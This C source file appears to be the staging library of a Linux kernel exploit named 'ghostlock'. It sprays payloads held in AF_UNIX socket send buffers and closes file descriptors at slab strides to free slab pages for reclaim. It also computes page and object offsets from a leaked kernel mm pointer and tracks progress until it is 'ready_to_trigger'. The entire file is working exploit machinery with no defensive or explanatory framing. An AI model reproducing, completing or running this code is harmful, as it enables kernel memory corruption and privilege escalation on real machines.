/* SPDX-License-Identifier: Apache-2.0 */
#include "reclaim_hold.h"

#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

static void set_first_marker_error(struct ghostlock_marker_result *result,
                                   size_t index, int error) {
  if (result->first_errno == 0) {
    result->first_errno = error;
    result->first_failed_index = index;
  }
}

void ghostlock_reclaim_batch_init(struct ghostlock_reclaim_batch *batch) {
  if (!batch) {
    return;
  }
  memset(batch, 0, sizeof(*batch));
  for (size_t pair = 0; pair < GHOSTLOCK_RECLAIM_MAX_PAIRS; pair++) {
    batch->sv[pair][0] = -1;
    batch->sv[pair][1] = -1;
  }
  batch->initialized = 1;
}

void ghostlock_reclaim_batch_close(struct ghostlock_reclaim_batch *batch) {
  if (!batch || !batch->initialized) {
    return;
  }
  for (size_t pair = 0; pair < GHOSTLOCK_RECLAIM_MAX_PAIRS; pair++) {
    for (size_t end = 0; end < 2; end++) {
      if (batch->sv[pair][end] >= 0) {
        close(batch->sv[pair][end]);
        batch->sv[pair][end] = -1;
      }
    }
  }
  batch->pair_count = 0;
  batch->held_sends = 0;
  batch->initialized = 0;
}

static int set_cloexec(int fd) {
  int flags = fcntl(fd, F_GETFD, 0);
  if (flags < 0) {
    return -1;
  }
  return fcntl(fd, F_SETFD, flags | FD_CLOEXEC);
}

static int set_nonblocking(int fd) {
  int flags = fcntl(fd, F_GETFL, 0);
  if (flags < 0) {
    return -1;
  }
  return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

int ghostlock_reclaim_batch_open(struct ghostlock_reclaim_batch *batch,
                                 size_t pair_count, int send_buffer_bytes) {
  if (!batch || pair_count == 0 ||
      pair_count > GHOSTLOCK_RECLAIM_MAX_PAIRS ||
      send_buffer_bytes <= 0) {
    errno = EINVAL;
    return -1;
  }

  if (batch->initialized) {
    ghostlock_reclaim_batch_close(batch);
  }
  ghostlock_reclaim_batch_init(batch);

  for (size_t pair = 0; pair < pair_count; pair++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, batch->sv[pair]) != 0) {
      int saved_errno = errno;
      ghostlock_reclaim_batch_close(batch);
      errno = saved_errno;
      return -1;
    }
    batch->pair_count++;

    if (set_cloexec(batch->sv[pair][0]) != 0 ||
        set_cloexec(batch->sv[pair][1]) != 0 ||
        setsockopt(batch->sv[pair][0], SOL_SOCKET, SO_SNDBUF,
                   &send_buffer_bytes, sizeof(send_buffer_bytes)) != 0 ||
        set_nonblocking(batch->sv[pair][0]) != 0) {
      int saved_errno = errno;
      ghostlock_reclaim_batch_close(batch);
      errno = saved_errno;
      return -1;
    }
  }
  return 0;
}

int ghostlock_reclaim_hold_one(struct ghostlock_reclaim_batch *batch,
                               const void *payload, size_t payload_len) {
  if (!batch || !batch->initialized || batch->pair_count == 0 || !payload ||
      payload_len == 0) {
    errno = EINVAL;
    return 0;
  }

  struct iovec iov = {
      .iov_base = (void *)payload,
      .iov_len = payload_len,
  };
  struct msghdr msg = {
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  int flags = MSG_DONTWAIT;
#ifdef MSG_NOSIGNAL
  flags |= MSG_NOSIGNAL;
#endif

  size_t pair = batch->held_sends % batch->pair_count;
  ssize_t sent = sendmsg(batch->sv[pair][0], &msg, flags);
  if (sent != (ssize_t)payload_len) {
    if (sent >= 0) {
      errno = EMSGSIZE;
    } else if (errno == 0) {
      errno = EIO;
    }
    return 0;
  }
  batch->held_sends++;
  return 1;
}

int ghostlock_reclaim_hold_all(struct ghostlock_reclaim_batch *batch,
                               const void *payload, size_t payload_len,
                               size_t send_count,
                               struct ghostlock_reclaim_result *result) {
  if (!result) {
    errno = EINVAL;
    return 0;
  }
  memset(result, 0, sizeof(*result));
  result->requested = send_count;
  result->failed_pair = -1;

  if (!batch || !batch->initialized || batch->pair_count == 0 || !payload ||
      payload_len == 0 || send_count == 0 || batch->held_sends != 0) {
    result->first_errno = EINVAL;
    errno = EINVAL;
    return 0;
  }

  for (size_t send_index = 0; send_index < send_count; send_index++) {
    size_t pair = send_index % batch->pair_count;
    errno = 0;
    if (!ghostlock_reclaim_hold_one(batch, payload, payload_len)) {
      int saved_errno = errno;
      result->first_errno = saved_errno ? saved_errno : EIO;
      result->failed_pair = (int)pair;
      errno = result->first_errno;
      break;
    }
    result->sent++;
    result->sent_per_pair[pair]++;
  }

  result->complete = result->sent == result->requested;
  return result->complete;
}

int ghostlock_close_slab_markers(int *fds, size_t fd_count,
                                 size_t objects_per_slab,
                                 struct ghostlock_marker_result *result) {
  if (!result) {
    errno = EINVAL;
    return 0;
  }
  memset(result, 0, sizeof(*result));
  result->first_failed_index = SIZE_MAX;

  if (!fds || fd_count == 0 || objects_per_slab == 0) {
    result->first_errno = EINVAL;
    errno = EINVAL;
    return 0;
  }

  for (size_t index = 0; index < fd_count; index += objects_per_slab) {
    result->requested++;
    if (fds[index] < 0) {
      set_first_marker_error(result, index, EBADF);
      continue;
    }
    int fd = fds[index];
    fds[index] = -1;
    if (close(fd) != 0) {
      set_first_marker_error(result, index, errno ? errno : EIO);
      continue;
    }
    result->closed++;
  }

  result->complete = result->closed == result->requested;
  if (!result->complete) {
    errno = result->first_errno ? result->first_errno : EIO;
  }
  return result->complete;
}

void ghostlock_prepare_result_init(struct ghostlock_prepare_result *result,
                                   int prepare_only) {
  if (!result) {
    return;
  }
  memset(result, 0, sizeof(*result));
  result->stage = GHOSTLOCK_PREPARE_IDLE;
  result->prepare_only = prepare_only != 0;
  result->markers.first_failed_index = SIZE_MAX;
  result->reclaim.failed_pair = -1;
}

void ghostlock_prepare_fail(struct ghostlock_prepare_result *result,
                            int failure_errno) {
  if (!result) {
    return;
  }
  result->failure_errno = failure_errno ? failure_errno : EIO;
  result->capture_verified = 0;
  result->ready_to_trigger = 0;
  result->stage = GHOSTLOCK_PREPARE_FAILED;
}

int ghostlock_prepare_note_leak(struct ghostlock_prepare_result *result,
                                uintptr_t leaked_mm, size_t page_size,
                                size_t object_stride) {
  if (!result || result->stage != GHOSTLOCK_PREPARE_IDLE || leaked_mm == 0 ||
      page_size == 0 || (page_size & (page_size - 1)) != 0 ||
      object_stride == 0 || object_stride > page_size) {
    if (result) {
      ghostlock_prepare_fail(result, EINVAL);
    }
    return 0;
  }

  result->leaked_mm = leaked_mm;
  result->page_base = leaked_mm & ~((uintptr_t)page_size - 1U);
  result->page_size = page_size;
  result->object_stride = object_stride;
  result->objects_per_slab = page_size / object_stride;
  result->leaked_offset = (size_t)(leaked_mm - result->page_base);
  result->stage = GHOSTLOCK_PREPARE_LEAK_VALID;
  return 1;
}

int ghostlock_prepare_note_page_release(
    struct ghostlock_prepare_result *result,
    const struct ghostlock_marker_result *markers) {
  if (!result || !markers ||
      result->stage != GHOSTLOCK_PREPARE_LEAK_VALID || !markers->complete) {
    if (result) {
      int error = markers && markers->first_errno ? markers->first_errno : EIO;
      ghostlock_prepare_fail(result, error);
    }
    return 0;
  }
  result->markers = *markers;
  result->stage = GHOSTLOCK_PREPARE_PAGE_RELEASED;
  return 1;
}

int ghostlock_prepare_note_spray(
    struct ghostlock_prepare_result *result,
    const struct ghostlock_reclaim_result *reclaim) {
  if (!result || !reclaim ||
      result->stage != GHOSTLOCK_PREPARE_PAGE_RELEASED || !reclaim->complete) {
    if (result) {
      int error = reclaim && reclaim->first_errno ? reclaim->first_errno : EIO;
      ghostlock_prepare_fail(result, error);
    }
    return 0;
  }
  result->reclaim = *reclaim;
  result->stage = GHOSTLOCK_PREPARE_SPRAY_HELD;
  return 1;
}

int ghostlock_prepare_note_trace(struct ghostlock_prepare_result *result,
                                 uint32_t trace_proof) {
  if (!result || result->stage != GHOSTLOCK_PREPARE_SPRAY_HELD) {
    if (result) {
      ghostlock_prepare_fail(result, EINVAL);
    }
    return 0;
  }

  result->trace_proof = trace_proof;
  if ((trace_proof & GHOSTLOCK_TRACE_REQUIRED) != GHOSTLOCK_TRACE_REQUIRED) {
    ghostlock_prepare_fail(result, ENODATA);
    return 0;
  }

  result->capture_verified = 1;
  result->ready_to_trigger = !result->prepare_only;
  result->stage = GHOSTLOCK_PREPARE_CAPTURE_VERIFIED;
  return 1;
}
